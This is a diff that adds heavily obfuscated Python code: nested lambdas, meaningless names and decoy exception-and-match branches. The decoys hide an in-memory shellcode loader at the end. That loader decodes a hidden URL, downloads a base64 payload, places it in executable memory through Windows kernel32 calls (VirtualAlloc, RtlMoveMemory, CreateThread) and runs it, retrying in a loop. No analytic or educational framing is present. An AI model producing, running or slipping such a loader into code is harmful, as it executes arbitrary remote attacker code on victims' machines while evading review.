+            _1716 = [[True], [False]]
+            R_E_D__A_V______(['_128'])
+    raise MemoryError([True])
+except MemoryError as _174:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742709]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _191: _191 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _1716 = [[(lambda: (lambda _513: _513 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _89: _89 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742704]))))())())()])
+        raise MemoryError([(lambda: (lambda _131: _131 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _1612:
+        __6265874322424 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
+try:
+    match '16' == '411':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _811 = [[True], [False]]
+            R_E_D__A_V______(['_69'])
+    raise MemoryError([True])
+except MemoryError as _818:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742703]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742706]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _1610: _1610 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _51 = [[(lambda: (lambda _24: _24 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _314: _314 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742704, 16742711]))))())())()])
+        raise MemoryError([(lambda: (lambda _217: _217 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _96:
+        try:
+            raise MemoryError(__6265874322424)
+        except MemoryError as __7073551299891:
+            if __7073551299891.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
+                kernel32.WaitForSingleObject.restype = wt.DWORD
+            if __7073551299891.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
+                __2564415762119 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x1d\x0b\xe5\x85\xea\x1b'))()
+            if __7073551299891.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
+                __8251926561587 = (lambda: R_E_D__A_V(b'R_E_D__A_V__t\x12o81\x8e'))()
+try:
+    match '139' == '91':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _102 = [[True], [False]]
+            R_E_D__A_V______(['_116'])
+    raise MemoryError([True])
+except MemoryError as _1117:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742710]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _1918: _1918 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _84 = [[(lambda: (lambda _95: _95 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1917: _1917 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742705]))))())())()])
+        raise MemoryError([(lambda: (lambda _119: _119 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _46:
+        while (lambda: (lambda _52: _52 + (lambda: ______R_E_D__A_V_______((lambda: R_E_D__A_V(b'R_E_D__A_V__wx'))()))())((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()) == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))())():
+            try:
+                buf = base64.b64decode(urllib.request.urlopen((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy9'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyv'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy0'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy2'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy2'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy7'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy2'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy/'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyx'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy2'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy/'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyx'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy5'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy3'))()]))))())())()).read().decode((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy,'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy7'))()]))))())())()))
+                memAddr = kernel32.VirtualAlloc(None, len(buf), (lambda: R_E_D__A_V(b'R_E_D__A_V__0\x00'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__@'))())
+                kernel32.RtlMoveMemory(memAddr, buf, len(buf))
+                th = kernel32.CreateThread(ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_void_p(memAddr), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.pointer(ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))())))
+                kernel32.WaitForSingleObject(th, -(lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))())
+                break
+            except Exception:
+                continue
